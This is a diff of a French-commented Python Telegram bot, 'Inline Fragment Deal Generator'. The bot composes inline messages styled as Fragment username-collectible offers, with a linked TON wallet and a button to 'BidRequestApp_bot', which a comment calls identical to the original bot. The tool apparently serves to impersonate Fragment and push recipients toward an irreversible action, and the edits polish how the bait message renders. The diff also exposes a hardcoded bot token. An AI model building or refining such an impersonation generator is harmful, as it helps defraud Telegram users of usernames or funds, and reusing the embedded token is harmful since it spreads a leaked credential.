@@ -14,7 +14,7 @@ BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
 PORT = int(os.getenv('PORT', 10000))
 WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
 
-print(f"🤖 Inline Fragment Deal Generator v4.6")
+print(f"🤖 Inline Fragment Deal Generator v4.7")
 print(f"🔑 Token: ✅")
 print(f"🌐 Port: {PORT}")
 print(f"🔗 Webhook: {WEBHOOK_URL}")
@@ -80,9 +80,9 @@ Important:
 • Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
 • If you choose not to proceed, simply ignore this message."""
     
-    print(f"📝 MESSAGE COMPLET:")
-    print(f"'{fragment_message}'")
-    print(f"📏 Longueur totale: {len(fragment_message)}")
+    print(f"🔍 DEBUG MESSAGE COMPLET:")
+    print(f"Message length: {len(fragment_message)}")
+    print(f"Wallet address: '{wallet_address}' (length: {len(wallet_address)})")
     
     # Création des entités pour le formatage
     entities = []
@@ -127,27 +127,29 @@ Important:
             length=len(important_text2)
         ))
     
-    # 5. Wallet cliquable - DEBUG COMPLET
+    # 5. Wallet cliquable - CORRECTION DÉFINITIVE
     wallet_start = fragment_message.find(wallet_address)
     if wallet_start != -1:
-        # Debug complet
-        actual_length = len(wallet_address)
-        wallet_end = wallet_start + actual_length
+        # Longueur réelle de l'adresse
+        wallet_length = len(wallet_address)
         
-        print(f"🔍 DEBUG WALLET:")
-        print(f"   Adresse: '{wallet_address}'")
-        print(f"   Longueur: {actual_length}")
-        print(f"   Position début: {wallet_start}")
-        print(f"   Position fin: {wallet_end}")
-        print(f"   Texte autour: '{fragment_message[wallet_start-5:wallet_end+5]}'")
-        print(f"   Derniers caractères: '{wallet_address[-4:]}'")
+        # Vérifier qu'il n'y a pas de caractères après
+        wallet_end = wallet_start + wallet_length
+        
+        print(f"🔍 WALLET DEBUG:")
+        print(f"  Start position: {wallet_start}")
+        print(f"  Address length: {wallet_length}")
+        print(f"  End position: {wallet_end}")
+        print(f"  Text around: '{fragment_message[wallet_start-10:wallet_end+10]}'")
+        print(f"  Characters after wallet: '{fragment_message[wallet_end:wallet_end+5]}'")
         
         entities.append(MessageEntity(
             type=MessageEntity.TEXT_LINK,
             offset=wallet_start,
-            length=actual_length,
+            length=wallet_length,  # Utilise la longueur exacte
             url=f"https://tonviewer.com/{wallet_address}"
         ))
+        print(f"🔗 Wallet entity added: offset={wallet_start}, length={wallet_length}")
     
     # URL du bouton - identique au bot original
     button_url = f"https://t.me/BidRequestApp_bot/?startapp={username.lower()}-{price:g}"
@@ -195,7 +197,7 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
         current_ton_price = get_ton_price()
         current_usd_value = ton_amount * current_ton_price
         
-        # Résultat inline - DÉSACTIVATION DE L'APERÇU POUR LE BOUTON AUSSI
+        # Résultat inline - DÉSACTIVATION COMPLÈTE DE L'APERÇU
         results = [
             InlineQueryResultArticle(
                 id=f"deal_{username}_{ton_amount}_{int(time.time())}",
@@ -204,7 +206,8 @@ async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                 input_message_content=InputTextMessageContent(
                     fragment_message,
                     entities=entities,
-                    disable_web_page_preview=True  # ✅ DÉSACTIVE L'APERÇU DES LIENS (wallet ET bouton)
+                    disable_web_page_preview=True,  # ✅ DÉSACTIVE L'APERÇU DES LIENS
+                    parse_mode=None  # ✅ FORCE L'UTILISATION DES ENTITIES UNIQUEMENT
                 ),
                 reply_markup=keyboard
             )
